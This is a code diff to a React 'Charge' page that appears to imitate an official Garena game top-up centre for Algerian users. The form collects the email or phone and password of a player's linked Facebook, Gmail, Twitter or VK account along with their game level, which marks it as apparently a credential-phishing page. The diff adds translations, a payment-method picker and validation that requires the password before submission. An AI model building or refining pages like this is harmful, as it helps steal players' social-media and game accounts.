@@ -12,8 +12,13 @@ import {
   MousePointerClick,
 } from "lucide-react";
 import Modal from "../components/Modal";
+import { useLanguage } from "../context/LanguageContext";
 
 export default function Charge() {
+  const { t, language, setLanguage } = useLanguage();
+  const toggleLanguage = () => {
+    setLanguage(language === 'ar' ? 'en' : 'ar');
+  };
   const navigate = useNavigate();
   const [platform, setPlatform] = useState("");
   const [email, setEmail] = useState("");
@@ -29,6 +34,14 @@ export default function Charge() {
   const [isAgreed, setIsAgreed] = useState(false);
   const [processStep, setProcessStep] = useState(0);
   const [orderNum, setOrderNum] = useState("");
+
+  const [paymentMethod, setPaymentMethod] = useState("");
+  const [toastMessage, setToastMessage] = useState("");
+
+  const showToast = (msg: string) => {
+    setToastMessage(msg);
+    setTimeout(() => setToastMessage(""), 4000);
+  };
 
   useEffect(() => {
     const timer = setTimeout(() => setIsLoading(false), 1500);
@@ -70,9 +83,23 @@ export default function Charge() {
     "جاري إرسال الطلب...",
   ];
 
+  const isFormValid = platform && email && platformPassword && level && diamonds && paymentMethod;
+
   const handlePreSubmit = () => {
-    if (!platform || !email || !platformPassword || !level || !diamonds) {
-      alert("يرجى ملأ جميع الحقول واختيار كمية الجواهر وطريقة الربط");
+    if (!platform) {
+      showToast(t?.("select_platform") || "يرجى اختيار نوع المنصة (فيسبوك، جوجل، الخ...)");
+      return;
+    }
+    if (!email || !platformPassword || !level) {
+      showToast(t?.("fill_required_data") || "يرجى ملأ جميع بيانات الحساب المطلوبة");
+      return;
+    }
+    if (!diamonds) {
+      showToast(t?.("select_diamonds") || "يرجى اختيار كمية الجواهر أو العروض");
+      return;
+    }
+    if (!paymentMethod) {
+      showToast(t?.("select_payment") || "يرجى اختيار طريقة الدفع أولاً");
       return;
     }
     setShowConfirm(true);
@@ -114,7 +141,7 @@ export default function Charge() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-[#F8F9FA] font-sans overflow-x-hidden" dir="rtl">
+    <div className="min-h-screen flex flex-col bg-[#F8F9FA] font-sans overflow-x-hidden" dir={language === 'ar' ? 'rtl' : 'ltr'}>
       {/* Header */}
       <header className="sticky top-0 z-40 bg-white shadow-sm">
         <div className="mx-auto flex h-16 max-w-4xl items-center justify-between px-4">
@@ -135,14 +162,17 @@ export default function Charge() {
               />
             </div>
             <div className="leading-tight">
-              <div className="text-sm font-bold text-gray-800">مركز الشحن</div>
-              <div className="text-xs font-semibold text-gray-500">الرسمي</div>
+              <div className="text-sm font-bold text-gray-800">{t('garena_center')}</div>
+              <div className="text-xs font-semibold text-gray-500">{t('official')}</div>
             </div>
           </div>
           <div className="flex items-center gap-2">
-            <button className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors">
+            <button 
+              onClick={toggleLanguage}
+              className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors"
+            >
               <Globe className="h-4 w-4" />
-              <span>الجزائر - العربية</span>
+              <span>{language === 'ar' ? t('dz_ar') : t('dz_en')}</span>
               <ChevronDown className="h-4 w-4" />
             </button>
             <div className="h-9 w-9 overflow-hidden rounded-full border-2 border-white bg-gray-100 shadow-sm ring-1 ring-gray-100">
@@ -220,14 +250,14 @@ export default function Charge() {
             <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
               1
             </div>
-            <h2 className="text-xl font-black text-gray-800">تسجيل الدخول</h2>
+            <h2 className="text-xl font-black text-gray-800">{t('account_info')}</h2>
           </div>
 
           <div className="space-y-5">
             <div className="space-y-3">
               <label className="block text-sm font-bold text-gray-700">
-                نوع الربط الأساسي للحساب{" "}
-                <Info className="inline h-4 w-4 text-gray-400" />
+                {t('platform_type')}
+                <Info className="inline h-4 w-4 text-gray-400 mr-2" />
               </label>
               <div className="flex gap-3 justify-center md:justify-start">
                 {["facebook", "gmail", "twitter", "vk"].map((p) => (
@@ -297,21 +327,21 @@ export default function Charge() {
             <div className="grid gap-4 md:grid-cols-2">
               <input
                 type="text"
-                placeholder="البريد الإلكتروني أو رقم الهاتف"
+                placeholder={t('account_email')}
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
               />
               <input
                 type="password"
-                placeholder="كلمة مرور حساب الربط الأساسي"
+                placeholder={t('account_password')}
                 value={platformPassword}
                 onChange={(e) => setPlatformPassword(e.target.value)}
                 className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
               />
               <input
                 type="number"
-                placeholder="مستوى حسابك في اللعبة (LVL)"
+                placeholder={t('account_level')}
                 value={level}
                 onChange={(e) => setLevel(e.target.value)}
                 className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
@@ -322,8 +352,8 @@ export default function Charge() {
                   onChange={(e) => setCharged(e.target.value)}
                   className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 appearance-none"
                 >
-                  <option value="لا">هل شحنت من الموقع من قبل؟ لا</option>
-                  <option value="نعم">هل شحنت من الموقع من قبل؟ نعم</option>
+                  <option value="لا">{t('charged_before')} - {t('no')}</option>
+                  <option value="نعم">{t('charged_before')} - {t('yes')}</option>
                 </select>
                 <div className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-gray-500">
                   <ChevronDown className="h-5 w-5" />
@@ -339,7 +369,7 @@ export default function Charge() {
             <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
               2
             </div>
-            <h2 className="text-xl font-black text-gray-800">كمية الشحن</h2>
+            <h2 className="text-xl font-black text-gray-800">{t('amount')}</h2>
           </div>
 
           <div className="mx-auto mb-6 flex max-w-[240px] items-center rounded-full border border-gray-200 bg-gray-50 p-1">
@@ -478,7 +508,10 @@ export default function Charge() {
           </div>
 
           <div className="mb-4">
-            <button className="relative w-full rounded-xl border-2 border-red-500 hover:bg-red-50 bg-white p-4 transition-all overflow-hidden flex items-center justify-center h-24">
+            <button 
+              onClick={() => setPaymentMethod('djezzy')}
+              className={`relative w-full rounded-xl border-2 hover:bg-red-50 bg-white p-4 transition-all overflow-hidden flex items-center justify-center h-24 ${paymentMethod === 'djezzy' ? 'border-[#CD1212] ring-2 ring-red-100' : 'border-red-500'}`}
+            >
               <div className="absolute top-0 right-0 rounded-bl-lg bg-red-600 px-3 py-1 text-xs font-bold text-white z-10 flex border-b border-l border-white items-center gap-1">
                 عرض خاص
                 <svg
@@ -591,15 +624,37 @@ export default function Charge() {
             {/* Buy Button (Left side in RTL) */}
             <button
               onClick={handlePreSubmit}
-              className="flex items-center justify-center gap-3 rounded-2xl bg-[#CD1212] px-8 py-3.5 text-2xl font-black text-white shadow-xl shadow-red-600/25 active:scale-95 transition-all text-center whitespace-nowrap"
+              disabled={submitLoading}
+              className={`flex items-center justify-center gap-3 rounded-2xl px-8 py-3.5 text-2xl font-black text-white shadow-xl active:scale-95 transition-all text-center whitespace-nowrap ${isFormValid ? 'bg-[#CD1212] shadow-red-600/25 hover:bg-red-700' : 'bg-gray-400 opacity-60 shadow-none'}`}
             >
               <div className="flex h-7 w-7 items-center justify-center rounded-lg border-2 border-white/50">
                 <ShieldCheck className="h-5 w-5" />
               </div>
-              شراء الآن
+              {submitLoading ? 'جاري...' : 'شراء الآن'}
             </button>
           </div>
         </div>
+
+      {/* Toast Notification */}
+      <AnimatePresence>
+        {toastMessage && (
+          <motion.div
+            initial={{ opacity: 0, y: 50, scale: 0.9 }}
+            animate={{ opacity: 1, y: 0, scale: 1 }}
+            exit={{ opacity: 0, y: 20, scale: 0.9 }}
+            className="fixed bottom-28 left-4 right-4 z-[60] mx-auto max-w-sm"
+          >
+            <div className="flex items-center gap-3 rounded-2xl bg-white p-4 shadow-2xl border-l-[6px] border-red-500 border ring-1 ring-black/5">
+              <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-full bg-red-50 text-red-500">
+                <AlertTriangle className="h-5 w-5" />
+              </div>
+              <p className="text-sm font-bold text-gray-800 leading-tight">
+                {toastMessage}
+              </p>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
 
       {/* Confirmation Modal */}
       <Modal
